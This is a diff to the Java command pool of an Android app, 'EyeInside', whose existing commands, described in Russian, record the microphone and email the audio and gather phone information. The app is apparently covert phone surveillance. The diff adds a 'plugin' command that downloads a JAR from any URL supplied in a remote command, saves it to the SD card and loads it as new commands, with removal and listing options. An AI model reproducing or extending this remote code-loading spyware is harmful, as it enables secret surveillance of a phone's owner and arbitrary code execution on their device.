@@ -1,8 +1,11 @@
 package com.code4bones.EyeInside;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.PrintStream;
+import java.net.URI;
 import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -10,6 +13,13 @@ import java.util.Calendar;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Set;
+
+import org.apache.http.HttpEntity;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.DefaultHttpClient;
+
 
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -24,6 +34,7 @@ import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.Message;
 import android.provider.Browser;
@@ -143,6 +154,8 @@ public class CommandPool {
 		Add(new CommandObjMic(CommandObj.CMD_MIC,"time:nn;[off] - записывать аудио nn секунд,файл на почту"));
 		Add(new CommandObjStats(CommandObj.CMD_STATS,"получить инфу о телефоне"));
 		Add(new CommandObjNotify(CommandObj.CMD_NOTIFY,"text:<message> - вывести сообщение в область уведомлений"));
+		Add(new CommandObjPlugin(CommandObj.CMD_PLUGIN,"[get:<http://<host>/<plugin>.jar][remove:<command name>][list]"));
+		
 		//Add(new CommandObjInvoke(CommandObj.CMD_INVOKE,"[command name] [params..]"));
 		//Add(new CommandObjKeepAlive(CommandObj.CMD_KEEPALIVE,"time:HHMM;[off] - рапортовать о состоянии каждые сутки в <HHMM>"));
 		
@@ -1612,7 +1625,125 @@ public class CommandPool {
 		}
 	}
 	
-	
+	public class CommandObjPlugin extends CommandObj {
+		public CommandObjPlugin(String name, String help) {
+			super(name, help);
+		}
+		
+		public int download() throws Exception {
+			if ( !CommandObj.hasExternal()) {
+				mCommandResult = "Карта памяти не доступна,загрузка плагина не возможна...";
+				return CommandObj.ERROR;
+			}
+			
+			if ( CommandObj.getExternalFreeSize() < 1024 * 1024 * 5) {
+				mCommandResult = "Недостаточно места на карте памяти, загрузка не возможна...";
+				return CommandObj.ERROR;
+			}
+
+			
+			DefaultHttpClient client = new DefaultHttpClient();
+	 		String path = mArgs.strValue("get");
+			NetLog.v("Downloading plugin from %s",path);
+			HttpGet get = new HttpGet(path);//"http://apache-mirror.rbc.ru/pub/apache//httpcomponents/httpclient/binary/httpcomponents-client-4.2.5-bin.tar.gz");
+			HttpResponse resp = client.execute(get);
+			
+			
+			HttpEntity ent = resp.getEntity();
+
+			String pluginDir = Environment.getExternalStorageDirectory().getAbsolutePath();
+			pluginDir += "/data/com.code4bones/plugins/";
+			
+			String fileName = pluginDir;// 
+			{ 
+			  File dummy = new File(get.getURI().getPath());
+			  fileName += "/" + dummy.getName();
+			}
+			File outFile = new File(fileName);
+			FileOutputStream fos = new FileOutputStream(outFile);
+			ent.writeTo(fos);
+			ent.consumeContent();
+			fos.close();
+			
+			// plugins manager
+			PluginManager plugins = new PluginManager(CommandPool.this);
+			int count = plugins.reloadPlugins(); 
+			if ( count > 0 )
+				mCommandResult = String.format("Библиотека загружена,команд найдено %d",count);
+			else
+				mCommandResult = String.format("Библиотека загружеа, но число команд не изменилось...");
+				
+			return CommandObj.ACK;
+		}
+		
+		public int delete() throws Exception {
+			String cmdName = mArgs.strValue("remove");
+			
+			CommandObj cmd = findCommand(cmdName);
+			if ( cmd == null ) {
+				mCommandResult = String.format("Соманда '%s' не найдена удаление не возможно...", cmdName);
+				return CommandObj.ERROR;
+			}
+			if ( !cmd.mIsPlugin ) {
+				mCommandResult = String.format("Команда %s является встроенной, и не может быть удалена",cmd.mCommandName);
+				return CommandObj.ERROR;
+			}
+			
+			
+			File file = new File(cmd.mPluginFile);
+			boolean fok = file.delete(); 
+		
+			PluginManager plugins = new PluginManager(CommandPool.this);
+			int count = plugins.reloadPlugins(); 
+
+			if ( fok )
+				mCommandResult = String.format("Пакет %s (c командой %s) удален и более не доступен !\nдоступно %d команд",file.getName(),cmd.mCommandName,count);
+			else
+				mCommandResult = "Не удалось удалить пакет "+file.getName();
+			
+			return CommandObj.ACK;
+		}
+		
+		public int list() {
+			NetLog.v("Lists plugins...");
+			Map<String,String> plugs = new HashMap<String,String>();
+			for ( CommandObj cmd : mCommands ) {
+				if ( !cmd.mIsPlugin )
+					continue;
+				String name;
+				String file = new File(cmd.mPluginFile).getName();
+				if ( plugs.containsKey(file)) 
+					name = plugs.get(file) + "," + cmd.mCommandName;
+				else
+					name = cmd.mCommandName;
+				plugs.put(file, name);
+			}
+			if ( plugs.isEmpty() ) {
+				mCommandResult = "Плагинов не найдено...";
+				return CommandObj.ACK;
+			}
+				
+			Set<String> keysSet = plugs.keySet();
+			mCommandResult = "";
+			for ( String key : keysSet.toArray(new String[]{}) ) {
+				if ( mCommandResult.length() != 0 )
+					mCommandResult += "\r\n-\r\n";
+				mCommandResult += String.format("пакет:%s [%s]",key,plugs.get(key));
+			}
+			return CommandObj.ACK;
+		}
+		
+		public int  Invoke() throws Exception {
+			if ( mArgs.hasArg("get")) {
+				return download();
+			} else if ( mArgs.hasArg("remove")) {
+				return delete();
+			} 
+			return list();
+		}
+		
+		
+	}
 }
 
 
